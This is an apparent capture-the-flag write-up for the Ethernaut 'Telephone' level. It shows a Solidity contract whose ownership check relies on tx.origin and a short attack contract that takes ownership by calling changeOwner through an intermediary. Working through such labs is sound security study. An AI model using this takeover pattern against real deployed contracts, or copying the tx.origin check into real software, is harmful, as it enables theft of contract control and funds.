Claim ownership of the contract below to complete this level.

  Things that might help

-   See the Help page above, section "Beyond the console"

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```



**SOLUTION:**

The solution here is to call the `changeOwner` fucntion, which is initiated in the challenge contract, from another contract that we write on our own. 

To solve this challenge, we have to understand how `tx.origin` works. When you call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that you initiated the function from, which is `tx.origin`. Deploy the following contract on remix and call the `attack` function to take over the victim contract.

```
pragma solidity ^0.8.0;

contract AttackTelephone {
    address victim = 0x5fD8a73D2F2BAb543A2a42bDEe3688a05f40829b;

    function attack() public {
        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", msg.sender);
        (bool success, ) = victim.call{value: 0}(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

We verify that we solved the challenge by clicking the "Submit Instance" button, verifying the transaction, through Metamask, and waiting to be confirmed.


